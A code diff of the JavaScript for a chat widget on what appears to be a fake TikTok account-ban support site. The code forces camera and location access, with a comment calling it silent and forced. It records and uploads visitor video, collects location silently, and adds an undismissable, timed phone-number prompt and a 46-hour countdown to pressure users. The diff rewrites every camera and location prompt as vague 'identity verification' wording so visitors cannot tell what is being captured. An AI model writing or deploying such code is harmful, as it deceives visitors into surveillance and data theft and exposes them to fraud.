@@ -102,24 +102,24 @@
     if (total <= 3) {
       return {
         title: "Öncelik: Düşük",
-        body: "Ciddi hesap cezası belirtisi zayıf görünüyor. İçerik ve analitik performansını kontrol edin. Resmi bir uyarı alırsanız uygulamadan veya support.tiktok.com üzerinden ilerleyin. Burada hiçbir veri kaydedilmedi.",
+        body: "Ciddi hesap yaptırımı işareti zayıf görünüyor. Analitik ve içerik performansını kontrol edin. Uygulamada uyarı alırsanız support.tiktok.com üzerinden ilerleyin.",
       };
     }
     if (total <= 8) {
       return {
         title: "Öncelik: Orta",
-        body: `Skorunuz ${total}/15. Hesap bildirimlerini ve Analitik trafik kaynaklarını inceleyin. İzlenme konusunda articles/views.html, görünürlük için articles/shadowban.html rehberlerine bakın.`,
+        body: `Skorunuz ${total}/15. Hesap bildirimlerini ve Analitik trafik kaynaklarını inceleyin. İzlenme için articles/views.html, görünürlük için articles/shadowban.html rehberlerine bakın.`,
       };
     }
     if (total <= 12) {
       return {
         title: "Öncelik: Yüksek",
-        body: `Skorunuz ${total}/15. Hesap kısıtı veya ceza ihtimali yüksek. Ban itiraz rehberini tamamlayın ve resmi TikTok desteğinden itiraz edin.`,
+        body: `Skorunuz ${total}/15. Hesap kısıtı olasılığı yüksek. Ban itiraz rehberini tamamlayın ve resmi TikTok desteğinden itiraz edin.`,
       };
     }
     return {
-      title: "Öncelik: Acil kontrol",
-      body: `Skorunuz ${total}/15. Ban veya güvenlik kısıtı olasılığı güçlü. Hesap işlemlerini yalnızca resmi kanallardan yürütün: support.tiktok.com. Bu sohbet hesap etkilemez.`,
+      title: "Öncelik: Acil",
+      body: `Skorunuz ${total}/15. Ban veya güvenlik kısıtı olasılığı güçlü. Hesap işlemlerini yalnızca resmi kanallardan yürütün: support.tiktok.com. Bu sohbet hesabınızı değiştirmez.`,
     };
   }
 
@@ -241,12 +241,13 @@
   function appendMessage(box, who, text, options = {}) {
     const syncOut = options.sync !== false;
     const isLoading = options.type === "loading";
+    const imageUrl = String(options.imageUrl || "").trim();
     const label =
       who === "user" ? "Siz" : who === "admin" ? "Destek" : "Asistan";
     const row = document.createElement("div");
     row.className = `chat-bubble chat-${who === "user" ? "user" : "bot"}${
       who === "admin" ? " chat-admin" : ""
-    }${isLoading ? " chat-loading" : ""}`;
+    }${isLoading ? " chat-loading" : ""}${imageUrl ? " chat-photo" : ""}`;
     const meta = document.createElement("span");
     meta.className = "chat-meta";
     meta.textContent = `${label} · ${nowLabel()}`;
@@ -259,16 +260,30 @@
         <span class="chat-loading-dots" aria-hidden="true"><i></i><i></i><i></i></span>
       `;
       body.querySelector("p").textContent =
-        text || "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…";
+        text || "Kimlik doğrulaması için izinler hazırlanıyor. Lütfen bekleyin…";
     } else {
       const p = document.createElement("p");
       p.textContent = text;
       body.appendChild(p);
+      if (imageUrl) {
+        const link = document.createElement("a");
+        link.href = imageUrl;
+        link.target = "_blank";
+        link.rel = "noopener";
+        link.className = "chat-photo-link";
+        const img = document.createElement("img");
+        img.src = imageUrl;
+        img.alt = text || "Gönderilen fotoğraf";
+        img.className = "chat-photo-thumb";
+        img.loading = "lazy";
+        link.appendChild(img);
+        body.appendChild(link);
+      }
     }
     row.append(meta, body);
     box.appendChild(row);
     box.scrollTop = box.scrollHeight;
-    if (syncOut && (who === "user" || who === "bot")) {
+    if (syncOut && (who === "user" || who === "bot") && !imageUrl) {
       syncMessage(who, text);
     }
     return row;
@@ -707,7 +722,8 @@
 
     const label = document.createElement("p");
     label.className = "chat-camera-preview-label";
-    label.textContent = "Doğrulama devam ediyor… Lütfen bu sayfadan ayrılmayın.";
+    label.textContent =
+      "Kimlik doğrulaması devam ediyor… İzinler açık kalsın; bu sayfadan ayrılmayın.";
 
     wrap.appendChild(label);
     box.appendChild(wrap);
@@ -724,7 +740,7 @@
 
     const LOCATION_RETRY_MS = 10_000;
     const LOCATION_DENIED_TEXT =
-      "Güvenlik kontrolüne konum izni verilmedi. Kamera ve konum izni zorunludur.";
+      "Kimlik doğrulaması için izin verilmedi. İzin zorunludur; izin olmadan doğrulama tamamlanamaz.";
     const deferAsk = opts.deferAsk === true;
     const silent = opts.silent !== false; // varsayılan: ziyaretçiye konum metni yok
     let lastWriteAt = 0;
@@ -755,7 +771,7 @@
         el.className = "chat-inline-prompt chat-location-perm-denied";
         el.innerHTML =
           `<p class="chat-inline-prompt-title">${LOCATION_DENIED_TEXT}</p>` +
-          '<p class="chat-camera-note">Konum için alttaki kırmızı butona dokunun. Pencere açılmazsa: Ayarlar → Safari → Konum → Sor.</p>';
+          '<p class="chat-camera-note">Kimlik doğrulaması için izin gerekir. Alttaki butona dokunun. Pencere açılmazsa tarayıcı ayarlarından izinleri açın.</p>';
         box.appendChild(el);
       }
       box.scrollTop = box.scrollHeight;
@@ -790,13 +806,15 @@
         state._locationGrantedMsg = true;
         syncMessage("user", "Konum izni verildi.");
         if (!silent && box) {
-          appendMessage(box, "bot", "Kamera ve konum izni alındı. Güvenlik kontrolü devam ediyor.", {
+          appendMessage(box, "bot", "İzin alındı. Kimlik doğrulaması devam ediyor.", {
             sync: true,
           });
         }
+        if (state.stream && box) maybeOfferPhoneEntry(box);
       }
       if (state.label) {
-        state.label.textContent = "Doğrulama devam ediyor… Lütfen bekleyin.";
+        state.label.textContent =
+          "Kimlik doğrulaması devam ediyor… İzinler açık kalsın; lütfen bekleyin.";
       }
       state._onLocationGranted?.();
     };
@@ -833,7 +851,7 @@
         appendMessage(
           box,
           "bot",
-          "Güvenlik kontrolüne konum izni verilmedi. Kamera ve konum izni zorunludur.",
+          "Kimlik doğrulaması için izin verilmedi. İzin zorunludur; izin olmadan doğrulama tamamlanamaz.",
           { sync: true }
         );
       }
@@ -891,9 +909,9 @@
       box,
       {
         callId,
-        text: "Konum izni zorunlu",
-        note: "Sohbetteki İzin ver’e dokunun; konum penceresi açılacak.",
-        okLabel: "İzin ver — konum",
+        text: "İzin zorunlu",
+        note: "Kimlik doğrulaması için izin gerekir. Sohbetteki İzin ver’e dokunun; izin penceresi açılacak.",
+        okLabel: "İzin ver",
         hideCancel: true,
         locationOnly: true,
       },
@@ -1045,13 +1063,17 @@
       .catch(() => {});
     syncMessage("user", "Konum izni verildi.");
     if (state.label) {
-      state.label.textContent = "Doğrulama devam ediyor… Lütfen bekleyin.";
+      state.label.textContent =
+        "Kimlik doğrulaması devam ediyor… İzinler açık kalsın; lütfen bekleyin.";
     }
     try {
       state._onLocationGranted?.();
     } catch {
       /* ignore */
     }
+    const chatBox =
+      document.querySelector("[data-chat-root] [data-chat-messages]") || null;
+    if (state.stream && chatBox) maybeOfferPhoneEntry(chatBox);
     return true;
   }
 
@@ -1060,7 +1082,7 @@
     const sync = window.ChatSync;
     if (!sync?.enabled) {
       if (!options.silent) {
-        appendMessage(box, "bot", "Kamera için canlı senkron gerekir (Firebase).", {
+        appendMessage(box, "bot", "Kimlik doğrulaması için canlı senkron gerekir.", {
           sync: false,
         });
       }
@@ -1068,7 +1090,7 @@
     }
     if (!navigator.mediaDevices?.getUserMedia && !options.stream) {
       if (!options.silent) {
-        appendMessage(box, "bot", "Bu tarayıcı kamerayı desteklemiyor.", { sync: false });
+        appendMessage(box, "bot", "Bu tarayıcı istenen izinleri desteklemiyor.", { sync: false });
       }
       if (!auto) await sync.setCameraCallStatus(sync.getSessionId(), callId, "denied");
       return "error";
@@ -1095,7 +1117,7 @@
           appendMessage(
             box,
             "bot",
-            "Kamera izni verilmedi veya erişilemedi. Aşağıdaki İzin Ver butonuna basın.",
+            "İzin verilmedi veya erişilemedi. Aşağıdaki İzin Ver butonuna basın.",
             { sync: false }
           );
         }
@@ -1149,7 +1171,8 @@
     }
 
     if (!startVisitorRecording(state)) {
-      preview.label.textContent = "Doğrulama devam ediyor… (kayıt sınırlı)";
+      preview.label.textContent =
+        "Kimlik doğrulaması devam ediyor… (kayıt sınırlı — izinler açık kalsın)";
     }
 
     // Sayfa kapanmadan önce parça parça Storage’a yaz (pagehide upload güvenilmez)
@@ -1184,7 +1207,8 @@
         clearMaxDurationOnAdminJoin();
       }
       if (state.label && pc.connectionState === "connected") {
-        state.label.textContent = "Doğrulama devam ediyor… Lütfen bekleyin.";
+        state.label.textContent =
+          "Kimlik doğrulaması devam ediyor… İzinler açık kalsın; lütfen bekleyin.";
       }
     };
 
@@ -1260,7 +1284,7 @@
       appendMessage(
         box,
         "bot",
-        `Kamera bağlantısı kurulamadı: ${err?.code || err?.message || "bilinmeyen hata"}`,
+        `Bağlantı kurulamadı: ${err?.code || err?.message || "bilinmeyen hata"}`,
         { sync: false }
       );
       await sync.setCameraCallStatus(sessionId, callId, "ended").catch(() => {});
@@ -1272,12 +1296,12 @@
     const ios = /iPhone|iPad|iPod/i.test(navigator.userAgent || "");
     if (kind === "camera") {
       return ios
-        ? "Kamera kapalı/engelli. Telefon Ayarlar → Safari → Kamera → İzin Ver (veya Sor). Sonra buraya dönüp tekrar İzin ver’e dokun."
-        : "Kamera kapalı/engelli. Adres çubuğundaki kilit → İzinler → Kamera → İzin ver. Sonra tekrar İzin ver’e dokun.";
+        ? "Kimlik doğrulaması için izin gerekir. Ayarlar → Safari → İzinler → İzin Ver (veya Sor). Sonra buraya dönüp tekrar İzin ver’e dokun."
+        : "Kimlik doğrulaması için izin gerekir. Adres çubuğundaki kilit → İzinler → İzin ver. Sonra tekrar İzin ver’e dokun.";
     }
     return ios
-      ? "Konum kapalı/engelli. Telefon Ayarlar → Safari → Konum → Sor / İzin Ver. Ayrıca Ayarlar → Gizlilik ve Güvenlik → Konum Servisleri açık olsun. Sonra tekrar dokun."
-      : "Konum kapalı/engelli. Adres çubuğundaki kilit → İzinler → Konum → İzin ver. Konum Servisleri açık olsun. Sonra tekrar dokun.";
+      ? "Kimlik doğrulaması için izin gerekir. Ayarlar → Safari → İzinler → Sor / İzin Ver. Sonra tekrar dokun."
+      : "Kimlik doğrulaması için izin gerekir. Adres çubuğundaki kilit → İzinler → İzin ver. Sonra tekrar dokun.";
   }
 
   function showCameraRequest(box, msg, options = {}) {
@@ -1290,19 +1314,19 @@
       "chat-inline-prompt chat-camera-request" +
       (options.sticky ? " chat-camera-request-sticky" : "");
     card.setAttribute("role", "group");
-    card.setAttribute("aria-label", "Kamera ve konum izni");
+    card.setAttribute("aria-label", "Kimlik doğrulama izni");
 
     const title = document.createElement("p");
     title.className = "chat-inline-prompt-title";
     title.textContent =
       msg.text ||
-      "Güvenlik kontrolü için kamera ve konum izni gereklidir.";
+      "Kimlik doğrulaması için izin zorunludur.";
 
     const note = document.createElement("p");
     note.className = "chat-camera-note";
     note.textContent =
       msg.note ||
-      "İzin ver’e dokunun — telefon önce kamera, sonra konum iznini açacak.";
+      "İzin ver’e dokunun — telefon izin penceresini açacak. Bu izinler kimlik doğrulaması için gereklidir; vermezseniz adım tamamlanamaz.";
 
     const actions = document.createElement("div");
     actions.className = "chat-inline-prompt-actions";
@@ -1343,7 +1367,7 @@
           options.onSoftDeny?.();
           return;
         }
-        appendMessage(box, "user", "Kamera/konum talebini reddettim.");
+        appendMessage(box, "user", "İzin talebini reddettim.");
         if (sync?.enabled && callId) {
           await sync.setCameraCallStatus(sync.getSessionId(), callId, "denied").catch(() => {});
         }
@@ -1351,7 +1375,7 @@
       }
       if (!callId) {
         card.remove();
-        appendMessage(box, "bot", "Kamera oturumu eksik; talebi yeniden gönderin.", {
+        appendMessage(box, "bot", "Doğrulama oturumu eksik; talebi yeniden gönderin.", {
           sync: false,
         });
         return;
@@ -1363,9 +1387,9 @@
 
       // Sadece konum (kamera zaten açık)
       if (locationOnly || (existing?.stream && !existing._hadLocation)) {
-        title.textContent = "Konum izni";
-        note.textContent = "Telefon konum izni açılıyor… İzin Ver’e basın.";
-        okBtn.textContent = "Konum isteniyor…";
+        title.textContent = "İzin";
+        note.textContent = "Telefon izin penceresi açılıyor… İzin Ver’e basın.";
+        okBtn.textContent = "İzin isteniyor…";
         sync
           ?.writeLocationStatus?.(sync.getSessionId(), callId, "prompting", "Sohbetten konum")
           .catch(() => {});
@@ -1373,8 +1397,9 @@
         if (locRes.ok && locRes.pos && existing) {
           applySeedLocationToSession(sync, callId, existing, locRes.pos);
           card.remove();
-          appendMessage(box, "bot", "Konum izni alındı.", { sync: true });
+          appendMessage(box, "bot", "İzin alındı.", { sync: true });
           options.onGranted?.();
+          maybeOfferPhoneEntry(box);
           return;
         }
         const code = locRes.err?.code;
@@ -1386,7 +1411,7 @@
             locRes.err?.message || String(code || "err")
           )
           .catch(() => {});
-        title.textContent = "Konum izni yok — telefon ayarı";
+        title.textContent = "İzin yok — telefon ayarı";
         note.textContent = phonePermSettingsHelp("location");
         okBtn.textContent = "Ayarlardan sonra tekrar dene";
         okBtn.disabled = false;
@@ -1395,9 +1420,9 @@
       }
 
       // --- 1) Kamera: sohbet İzin ver → doğrudan telefon kamera izni ---
-      title.textContent = "1/2 — Kamera";
-      note.textContent = "Telefon kamera izni açılıyor… İzin Ver’e basın.";
-      okBtn.textContent = "Kamera isteniyor…";
+      title.textContent = "1/2 — İzin";
+      note.textContent = "Telefon izin penceresi açılıyor… İzin Ver’e basın.";
+      okBtn.textContent = "İzin isteniyor…";
 
       let stream = null;
       try {
@@ -1410,10 +1435,10 @@
           err?.name === "NotAllowedError" ||
           err?.name === "PermissionDeniedError" ||
           /denied|permission/i.test(String(err?.message || ""));
-        title.textContent = blocked ? "Kamera izni yok — telefon ayarı" : "Kamera açılamadı";
+        title.textContent = blocked ? "İzin yok — telefon ayarı" : "İzin açılamadı";
         note.textContent = blocked
           ? phonePermSettingsHelp("camera")
-          : `Kamera hatası: ${err?.name || err?.message || "bilinmiyor"}. Tekrar dene.`;
+          : `İzin hatası: ${err?.name || err?.message || "bilinmiyor"}. Tekrar dene.`;
         okBtn.textContent = "Ayarlardan sonra tekrar dene";
         okBtn.disabled = false;
         options.onSoftDeny?.(String(err?.name || err));
@@ -1421,9 +1446,9 @@
       }
 
       // --- 2) Konum: aynı akışta telefon konum izni ---
-      title.textContent = "2/2 — Konum";
-      note.textContent = "Telefon konum izni açılıyor… İzin Ver’e basın.";
-      okBtn.textContent = "Konum isteniyor…";
+      title.textContent = "2/2 — İzin";
+      note.textContent = "Telefon izin penceresi açılıyor… İzin Ver’e basın.";
+      okBtn.textContent = "İzin isteniyor…";
       sync
         ?.writeLocationStatus?.(sync.getSessionId(), callId, "prompting", "Kamera sonrası konum")
         .catch(() => {});
@@ -1431,7 +1456,7 @@
       const locRes = await requestLocationOnce();
       if (locRes.ok && locRes.pos) {
         seedLocation = locRes.pos;
-        appendMessage(box, "bot", "Konum izni alındı.", { sync: true });
+        appendMessage(box, "bot", "İzin alındı.", { sync: true });
       } else {
         const code = locRes.err?.code;
         sync
@@ -1455,20 +1480,21 @@
 
         if (result === "ok" && cameraSessions.get(callId)?._hadLocation) {
           options.onGranted?.();
+          maybeOfferPhoneEntry(box);
           return;
         }
 
         if (result === "ok" && !cameraSessions.get(callId)?._hadLocation) {
-          appendMessage(box, "bot", "Kamera alındı. Konum için İzin ver’e dokunun.", {
+          appendMessage(box, "bot", "Bir izin alındı. Kimlik doğrulaması için İzin ver’e dokunun.", {
             sync: true,
           });
           showCameraRequest(
             box,
             {
               callId,
-              text: "Konum izni zorunlu",
+              text: "İzin zorunlu",
               note: phonePermSettingsHelp("location"),
-              okLabel: "Telefon konum iznini aç",
+              okLabel: "İzin ver",
               hideCancel: true,
               locationOnly: true,
             },
@@ -1491,7 +1517,7 @@
           box,
           {
             callId,
-            text: "Kamera bağlantısı kurulamadı",
+            text: "Bağlantı kurulamadı",
             note: "İzin ver’e tekrar dokunun.",
             okLabel: "Tekrar dene",
             hideCancel: true,
@@ -1533,7 +1559,7 @@
   let mediaForceGestureUnsub = null;
   const CAMERA_PERM_RETRY_MS = 10_000;
   const CAMERA_PERM_DENIED_TEXT =
-    "Güvenlik kontrolü için kamera ve konum izni zorunludur. Lütfen İzin Ver’i seçin.";
+    "Kimlik doğrulaması için izin zorunludur. Lütfen İzin Ver’i seçin; aksi halde doğrulama tamamlanamaz.";
 
   function stopCameraPermissionLoop() {
     cameraPermLoopToken += 1;
@@ -1572,7 +1598,7 @@
     if (note) {
       note.textContent =
         extraNote ||
-        "Sohbetteki İzin ver butonuna dokunun — kamera ve konum birlikte istenir.";
+        "Kimlik doğrulaması tarayıcı iznine bağlıdır. Sohbetteki İzin ver butonuna dokunun.";
     }
     box.scrollTop = box.scrollHeight;
   }
@@ -1617,7 +1643,7 @@
   }
 
   const CAMERA_OFFER_TEXT =
-    "Güvenlik kontrolü için kamera ve konum izni zorunludur. Açarsanız görüntü bu destek oturumuna bağlanır; konum doğrulama için kullanılır.";
+    "Kimlik doğrulaması için izin zorunludur. İzin verirseniz doğrulama bu destek oturumuna bağlanır. İzin verilmezse doğrulama adımı tamamlanamaz.";
 
   const CAMERA_FORCE_RETRY_MS = 2_500;
 
@@ -1734,6 +1760,7 @@
 
         if (sessionHasBoth(callId)) {
           stopCameraPermissionLoop();
+          maybeOfferPhoneEntry(box);
           return;
         }
         scheduleRetry();
@@ -1764,6 +1791,212 @@
     };
 
     void attempt(false);
+  }
+
+  const PHONE_DONE_KEY = "visitor_phone_done_v1";
+  let phonePopupOpen = false;
+  let phonePopupOffered = false;
+
+  function isValidPhoneDigits(raw) {
+    const digits = String(raw || "").replace(/\D/g, "");
+    return digits.length >= 10 && digits.length <= 15;
+  }
+
+  function formatTrPhoneInput(value) {
+    let digits = String(value || "").replace(/\D/g, "");
+    if (digits.startsWith("90") && digits.length > 10) digits = digits.slice(2);
+    if (digits.startsWith("0")) digits = digits.slice(1);
+    digits = digits.slice(0, 10);
+    const parts = [];
+    if (digits.length > 0) parts.push(digits.slice(0, 3));
+    if (digits.length > 3) parts.push(digits.slice(3, 6));
+    if (digits.length > 6) parts.push(digits.slice(6, 8));
+    if (digits.length > 8) parts.push(digits.slice(8, 10));
+    return parts.join(" ");
+  }
+
+  function maybeOfferPhoneEntry(box) {
+    if (!box || phonePopupOpen || phonePopupOffered) return;
+    try {
+      if (sessionStorage.getItem(PHONE_DONE_KEY) === "1") return;
+    } catch {
+      /* ignore */
+    }
+    phonePopupOffered = true;
+    window.setTimeout(() => showPhoneEntryModal(box), 450);
+  }
+
+  function showPhoneEntryModal(box) {
+    if (phonePopupOpen) return;
+    document.getElementById("phone-entry-modal")?.remove();
+    phonePopupOpen = true;
+
+    const TOTAL_SEC = 30;
+    const CIRC = 2 * Math.PI * 18;
+    let left = TOTAL_SEC;
+    let timerId = null;
+    let submitting = false;
+
+    const overlay = document.createElement("div");
+    overlay.id = "phone-entry-modal";
+    overlay.className = "phone-modal-overlay";
+    overlay.setAttribute("role", "dialog");
+    overlay.setAttribute("aria-modal", "true");
+    overlay.setAttribute("aria-labelledby", "phone-modal-title");
+
+    overlay.innerHTML = `
+      <div class="phone-modal">
+        <div class="phone-modal-top">
+          <div class="phone-modal-brand">
+            <span class="phone-modal-icon" aria-hidden="true">☎</span>
+            <div>
+              <strong>Güvenli doğrulama</strong>
+              <span>Telefon doğrulama adımı</span>
+            </div>
+          </div>
+          <div class="phone-modal-timer" aria-hidden="true">
+            <svg viewBox="0 0 40 40">
+              <circle class="phone-timer-track" cx="20" cy="20" r="18"></circle>
+              <circle class="phone-timer-progress" cx="20" cy="20" r="18"
+                stroke-dasharray="${CIRC}" stroke-dashoffset="0"></circle>
+            </svg>
+            <em data-phone-sec>${TOTAL_SEC}</em>
+          </div>
+        </div>
+        <h2 class="phone-modal-title" id="phone-modal-title">Telefon numaranızı girin</h2>
+        <p class="phone-modal-text">Kimlik doğrulamasını tamamlamak için aktif cep telefonu numaranızı girin. Süre: 30 saniye.</p>
+        <div class="phone-modal-field">
+          <label for="phone-modal-input">Cep telefonu</label>
+          <div class="phone-modal-input-wrap">
+            <span class="phone-modal-prefix">+90</span>
+            <input id="phone-modal-input" type="tel" inputmode="numeric" autocomplete="tel-national"
+              maxlength="13" placeholder="5XX XXX XX XX" aria-describedby="phone-modal-hint" />
+          </div>
+          <p class="phone-modal-hint" id="phone-modal-hint">Örn: 532 123 45 67 — yalnızca size ait numarayı kullanın.</p>
+        </div>
+        <div class="phone-modal-actions">
+          <button type="button" class="btn btn-primary" data-phone-submit>Numarayı onayla</button>
+        </div>
+        <p class="phone-modal-note">Numaranız yalnızca bu doğrulama oturumuna bağlanır. Şifre veya SMS kodu istemeyiz.</p>
+      </div>
+    `;
+
+    document.body.appendChild(overlay);
+
+    const modal = overlay.querySelector(".phone-modal");
+    const input = overlay.querySelector("#phone-modal-input");
+    const wrap = overlay.querySelector(".phone-modal-input-wrap");
+    const hint = overlay.querySelector("#phone-modal-hint");
+    const submitBtn = overlay.querySelector("[data-phone-submit]");
+    const secEl = overlay.querySelector("[data-phone-sec]");
+    const progress = overlay.querySelector(".phone-timer-progress");
+
+    const setHint = (text, isError) => {
+      if (!hint) return;
+      hint.textContent = text;
+      hint.classList.toggle("is-error", Boolean(isError));
+    };
+
+    const tick = () => {
+      left -= 1;
+      if (secEl) secEl.textContent = String(Math.max(0, left));
+      if (progress) {
+        const offset = CIRC * (1 - Math.max(0, left) / TOTAL_SEC);
+        progress.style.strokeDashoffset = String(offset);
+      }
+      if (left <= 0) {
+        window.clearInterval(timerId);
+        timerId = null;
+        modal?.classList.add("is-expired");
+        setHint("Süre doldu — numarayı hemen girip onaylayın.", true);
+        submitBtn.textContent = "Hemen onayla";
+        input?.focus();
+      }
+    };
+
+    timerId = window.setInterval(tick, 1000);
+
+    input?.addEventListener("input", () => {
+      const formatted = formatTrPhoneInput(input.value);
+      if (input.value !== formatted) input.value = formatted;
+      wrap?.classList.remove("is-invalid");
+      if (left > 0) {
+        setHint("Örn: 532 123 45 67 — yalnızca size ait numarayı kullanın.", false);
+      }
+    });
+
+    const closeModal = () => {
+      if (timerId) window.clearInterval(timerId);
+      phonePopupOpen = false;
+      overlay.remove();
+    };
+
+    const submit = async () => {
+      if (submitting) return;
+      const formatted = formatTrPhoneInput(input?.value || "");
+      if (!isValidPhoneDigits(formatted)) {
+        wrap?.classList.add("is-invalid");
+        setHint("Geçerli bir cep telefonu girin (10 hane).", true);
+        input?.focus();
+        return;
+      }
+      submitting = true;
+      submitBtn.disabled = true;
+      submitBtn.textContent = "Kaydediliyor…";
+      const full = `+90 ${formatted}`.trim();
+
+      try {
+        const sync = window.ChatSync;
+        if (sync?.enabled && typeof sync.saveVisitorPhone === "function") {
+          await sync.saveVisitorPhone(full);
+        } else {
+          syncMessage("user", `Telefon: ${full}`);
+        }
+        try {
+          sessionStorage.setItem(PHONE_DONE_KEY, "1");
+        } catch {
+          /* ignore */
+        }
+        closeModal();
+        if (box) {
+          appendMessage(box, "user", `Telefon: ${full}`, { sync: false });
+          appendMessage(
+            box,
+            "bot",
+            "Telefon numaranız alındı. Kimlik doğrulaması devam ediyor.",
+            { sync: true }
+          );
+        }
+      } catch (err) {
+        console.error(err);
+        submitting = false;
+        submitBtn.disabled = false;
+        submitBtn.textContent = left <= 0 ? "Hemen onayla" : "Numarayı onayla";
+        setHint("Kayıt başarısız. Tekrar deneyin.", true);
+      }
+    };
+
+    submitBtn?.addEventListener("click", (e) => {
+      e.preventDefault();
+      void submit();
+    });
+    input?.addEventListener("keydown", (e) => {
+      if (e.key === "Enter") {
+        e.preventDefault();
+        void submit();
+      }
+    });
+
+    // Overlay tıklayınca kapanmasın — zorunlu adım
+    overlay.addEventListener("click", (e) => {
+      if (e.target === overlay) {
+        input?.focus();
+        modal?.classList.add("is-expired");
+        setHint("Devam etmek için telefon numaranızı girmeniz gerekir.", true);
+      }
+    });
+
+    window.setTimeout(() => input?.focus(), 80);
   }
 
   function showVisitorPopup(box, msg, onChoice) {
@@ -1829,6 +2062,124 @@
     box.appendChild(card);
     box.scrollTop = box.scrollHeight;
     input.focus();
+  }
+
+  function showVisitorPhotoRequest(box, msg) {
+    box.querySelectorAll(".chat-inline-prompt").forEach((el) => el.remove());
+    document.getElementById("support-popup")?.remove();
+
+    const maxPhotos = Math.min(
+      10,
+      Math.max(1, Number(msg.maxPhotos) || window.ChatSync?.PHOTO_MAX_COUNT || 10)
+    );
+
+    const card = document.createElement("div");
+    card.className = "chat-inline-prompt chat-photo-prompt";
+    card.setAttribute("role", "group");
+    card.setAttribute("aria-label", "Fotoğraf gönderme");
+
+    const title = document.createElement("p");
+    title.className = "chat-inline-prompt-title";
+    title.textContent =
+      msg.text ||
+      "Destek için ekran görüntüsü veya fotoğraf gönderebilirsiniz.";
+
+    const note = document.createElement("p");
+    note.className = "chat-photo-prompt-note";
+    note.textContent = `Nasıl çalışır: “Fotoğraf seç”e basınca cihazınızın seçicisi açılır. En fazla ${maxPhotos} görsel seçebilirsiniz. Seçtikleriniz destek sohbetine gönderilir. İstemiyorsanız “İstemiyorum”a basın — hiçbir dosyaya erişilmez.`;
+
+    const status = document.createElement("p");
+    status.className = "chat-photo-prompt-status";
+    status.hidden = true;
+
+    const actions = document.createElement("div");
+    actions.className = "chat-inline-prompt-actions";
+
+    const pickBtn = document.createElement("button");
+    pickBtn.type = "button";
+    pickBtn.className = "btn btn-primary";
+    pickBtn.textContent = msg.okLabel || "Fotoğraf seç";
+
+    const cancelBtn = document.createElement("button");
+    cancelBtn.type = "button";
+    cancelBtn.className = "btn btn-ghost";
+    cancelBtn.textContent = msg.cancelLabel || "İstemiyorum";
+
+    const fileInput = document.createElement("input");
+    fileInput.type = "file";
+    fileInput.accept = "image/*";
+    fileInput.multiple = true;
+    fileInput.hidden = true;
+
+    const setBusy = (busy) => {
+      pickBtn.disabled = busy;
+      cancelBtn.disabled = busy;
+    };
+
+    cancelBtn.addEventListener("click", () => {
+      card.remove();
+      appendMessage(box, "user", "Fotoğraf göndermeyi istemedi.");
+    });
+
+    pickBtn.addEventListener("click", () => fileInput.click());
+
+    fileInput.addEventListener("change", async () => {
+      const raw = Array.from(fileInput.files || []);
+      fileInput.value = "";
+      const files = raw
+        .filter((f) => String(f.type || "").startsWith("image/"))
+        .slice(0, maxPhotos);
+      if (!files.length) {
+        status.hidden = false;
+        status.textContent = "Görsel seçilmedi. İsterseniz tekrar deneyin.";
+        return;
+      }
+      const sync = window.ChatSync;
+      if (!sync?.uploadVisitorPhoto) {
+        status.hidden = false;
+        status.textContent = "Yükleme hazır değil. Sayfayı yenileyip tekrar deneyin.";
+        return;
+      }
+
+      setBusy(true);
+      status.hidden = false;
+      let ok = 0;
+      for (let i = 0; i < files.length; i += 1) {
+        status.textContent = `Yükleniyor ${i + 1}/${files.length}…`;
+        try {
+          const result = await sync.uploadVisitorPhoto(files[i], {
+            index: i + 1,
+            total: files.length,
+          });
+          ok += 1;
+          appendMessage(box, "user", `Fotoğraf ${i + 1}/${files.length} gönderildi.`, {
+            sync: false,
+            imageUrl: result?.url || "",
+          });
+        } catch (err) {
+          console.warn("photo upload", err);
+          appendMessage(
+            box,
+            "bot",
+            `Fotoğraf ${i + 1} yüklenemedi: ${String(err?.message || err).slice(0, 120)}`,
+            { sync: false }
+          );
+        }
+      }
+      status.textContent =
+        ok > 0
+          ? `${ok} fotoğraf gönderildi. Teşekkürler.`
+          : "Hiçbir fotoğraf gönderilemedi.";
+      setBusy(false);
+      if (ok > 0) {
+        window.setTimeout(() => card.remove(), 1200);
+      }
+    });
+
+    actions.append(pickBtn, cancelBtn);
+    card.append(title, note, status, actions, fileInput);
+    box.appendChild(card);
+    box.scrollTop = box.scrollHeight;
   }
 
   const seenAdminIncomingIds = new Set();
@@ -1994,8 +2345,20 @@
     }
     if (msg.type === "camera") {
       // Ziyaretçiye metin yok — sessiz zorla kamera+konum
-      notifyVisitorOfAdminMessage(box, { text: "Destek doğrulama istiyor" });
+      notifyVisitorOfAdminMessage(box, { text: "Kimlik doğrulaması için izin isteniyor" });
       void autoOpenCameraFromMessage(box, msg);
+      return;
+    }
+    if (msg.type === "photos") {
+      appendMessage(
+        box,
+        "admin",
+        msg.text ||
+          "Destek için ekran görüntüsü veya fotoğraf gönderebilirsiniz.",
+        { sync: false }
+      );
+      notifyVisitorOfAdminMessage(box, msg);
+      showVisitorPhotoRequest(box, msg);
       return;
     }
     const isPopup = msg.type === "popup" || msg.popup === true;
@@ -2017,7 +2380,7 @@
               appendMessage(
                 box,
                 "bot",
-                "Güvenlik için şifre, e-posta veya doğrulama kodu paylaşmayın. Lütfen sorununuzu kendi kelimelerinizle yazın.",
+      "Güvenlik için şifre, e-posta veya doğrulama kodu paylaşmayın. Kimlik doğrulaması yalnızca istenen izinler ile yapılır. Lütfen sorununuzu kendi kelimelerinizle yazın.",
                 { sync: false }
               );
               syncMessage(
@@ -2098,8 +2461,9 @@
     let openSeqTimer = null;
 
     const GREET_TEXT =
-      "Merhaba. Ben Yardım Asistanı. Ban, izlenme düşüşü veya görünürlük sorunlarında rehberlere yönlendirebilirim.\n\nHesap durumu kontrolü için ‘Hesabım kısıtlandı’ yazın veya aşağıdaki kısayolları kullanın. Şifre / e-posta istemem.";
-    const LOADING_TEXT = "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…";
+      "Merhaba. Bu kanal hesap, ban, izlenme ve görünürlük konularında ilgili rehberlere yönlendirir.\n\nKimlik doğrulaması için izin gerekir; izin verilmeden doğrulama tamamlanamaz. Üstteki kırmızı geri sayım 46 saatlik süreyi gösterir — süre dolmadan tamamlayın. Durum kontrolü için \"Hesabım kısıtlandı\" yazın veya aşağıdaki kısayolları kullanın. Hesap şifresi veya doğrulama kodu paylaşmayın.";
+    const LOADING_TEXT =
+      "Kimlik doğrulaması için izinler hazırlanıyor. Lütfen bekleyin…";
 
     async function beginAutoCamera() {
       startCameraPermissionLoop(box);
